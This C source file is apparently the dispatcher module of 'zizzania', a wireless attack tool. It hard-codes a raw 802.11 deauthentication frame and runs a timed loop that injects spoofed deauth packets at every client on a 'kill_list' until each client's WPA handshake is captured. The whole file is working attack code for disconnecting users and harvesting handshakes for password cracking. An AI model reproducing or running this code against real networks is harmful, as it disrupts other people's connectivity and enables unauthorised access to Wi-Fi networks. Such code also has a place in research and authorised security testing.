#include <unistd.h>
#include <errno.h>
#include <string.h>
#include "debug.h"
#include "zizzania.h"
#include "dispatcher.h"

#define KILL_LOOP_INTERVAL 10

#define DEAUTHENTICATION_PACKET_SIZE 34
#define DEAUTHENTICATION_PACKET                         \
    /* radiotap */                                      \
    "\x00"                     /* version */            \
    "\x00"                     /* padding */            \
    "\x08\x00"                 /* length */             \
    "\x00\x00\x00\x00"         /* present */            \
    /* ieee80211_mac */                                 \
    "\xc0\x00"                 /* frame control */      \
    "\x3a\x01"                 /* duration */           \
    "\x00\x00\x00\x00\x00\x00" /* destination */        \
    "\x00\x00\x00\x00\x00\x00" /* source */             \
    "\x00\x00\x00\x00\x00\x00" /* bssid */              \
    "\x40\x06"                 /* sequence control */   \
    "\x07\x00"                 /* reason */

void zizzania_deauthenticate( struct zizzania *z )
{
    GHashTableIter i;
    const ieee80211_addr_t client_addr;
    const uint8_t *packet;

    /* scan hashtable */
    for ( g_hash_table_iter_init( &i , z->kill_list ) ;
          g_hash_table_iter_next( &i , ( void * )&client_addr , ( void * )&packet ) ; )
    {
#ifdef DEBUG
        char client_addr_str[18];
        ieee80211_addr_sprint( client_addr , client_addr_str );
        PRINTF( "deauthenticating client %s" , client_addr_str );
#endif

        /* send packet */
        if ( pcap_inject( z->handler , packet , DEAUTHENTICATION_PACKET_SIZE ) == -1 )
        {
            sprintf( z->error_buffer , "cannot send deauthentication packet" );
            PRINT( z->error_buffer );
            z->stop = 1;
        }
    }
}

void * zizzania_dispatcher( void *arg )
{
    struct zizzania *z = arg;
    sigset_t set;
    struct timespec timeout = { 0 };

    /* prepare timed wait */
    sigfillset( &set );
    timeout.tv_sec = KILL_LOOP_INTERVAL;

    /* wait for events */
    while ( 1 )
    {
        switch( errno = 0 , sigtimedwait( &set , NULL , &timeout ) )
        {
        case SIGINT:
        case SIGTERM:
            PRINT( "signal catched" );
            z->stop = 1;
            break;

        case -1: /* error or timeout */
            /* restart system call after a signal */
            if ( errno == EINTR ) continue;

            /* EAGAIN on timeout */
            if ( errno != EAGAIN )
            {
                sprintf( z->error_buffer , "sigtimedwait error: %s" , strerror( errno ) );
                PRINT( z->error_buffer );
                z->stop = 1;
                return ( void * )0;
            }
            break;

            /* do nothing other signals */
        }

        /* break loop */
        if ( z->stop == 1 ) break;

        PRINT( "waking up killer" );

        /* start deauthentication loop (if not passive) */
        if ( !z->setup.passive )
        {
            struct zizzania_killer_message message;

            /* while there are pending messages */
            while ( read( z->comm[0] , &message , sizeof( struct zizzania_killer_message ) ) > 0 )
            {
                switch ( message.action )
                {
                case ZIZZANIA_NEW_CLIENT:
                    {
                        struct ieee80211_mac_header *mac_header;
                        u_char *packet = g_memdup( DEAUTHENTICATION_PACKET , DEAUTHENTICATION_PACKET_SIZE );

                        /* craft packet */
                        mac_header = ( struct ieee80211_mac_header * )( packet + sizeof( struct ieee80211_radiotap_header ) );
                        memcpy( mac_header->address_1 , message.client , 6 );
                        memcpy( mac_header->address_2 , message.bssid , 6 );
                        memcpy( mac_header->address_3 , message.bssid , 6 );

                        /* save it in the hashtable */
                        g_hash_table_insert( z->kill_list , g_memdup( message.client , 6 ) , packet );
                        break;
                    }

                case ZIZZANIA_HANDSHAKE:
                    /* stop deauthenticating it */
                    g_hash_table_remove( z->kill_list , message.client );
                    break;
                }
            }

            /* send deauthentication packets */
            zizzania_deauthenticate( z );
        }
    }

    return ( void * )1;
}